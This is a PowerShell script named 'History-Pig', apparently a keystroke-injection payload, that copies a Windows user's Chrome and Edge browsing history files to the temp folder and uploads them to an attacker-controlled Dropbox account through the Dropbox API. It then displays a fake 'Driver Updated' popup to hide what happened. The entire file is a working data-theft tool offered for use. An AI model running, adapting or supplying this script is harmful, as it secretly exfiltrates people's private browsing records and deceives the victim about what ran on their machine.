#History-Pig

# See if file is a thing
Test-Path -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" -PathType Leaf

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/History" -PathType Leaf)) {
     try {
         Write-Host "The Chrome History file has not been found. "
     }
     catch {
         throw $_.Exception.Message
     }
 }
 # Copy Chrome History to Temp Directory to get sent to Dropbox
  else {
     $F1 = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_chrome_history"
     Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/History" -Destination "$env:tmp/$F1" 
 }

# See if file is a thing
Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/History" -PathType Leaf

#If the file does not exist, write to host.
if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/History" -PathType Leaf)) {
    try {
        Write-Host "The Edge History file has not been found. "
    }
    catch {
        throw $_.Exception.Message
    }
}
 # Copy Edge History to Temp Directory to get sent to Dropbox
 else {
    $F2 = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_edge_history"
    Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/History" -Destination "$env:tmp/$F2" 
}

function DropBox-Upload {

    [CmdletBinding()]
    param (
        
    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    [Alias("f")]
    [string]$SourceFilePath
    ) 
    $DropBoxAccessToken = "ADD-YOUR-DROPBOX-TOKEN-HERE"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }

DropBox-Upload -f "$env:tmp/$F1"
DropBox-Upload -f "$env:tmp/$F2"

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1)
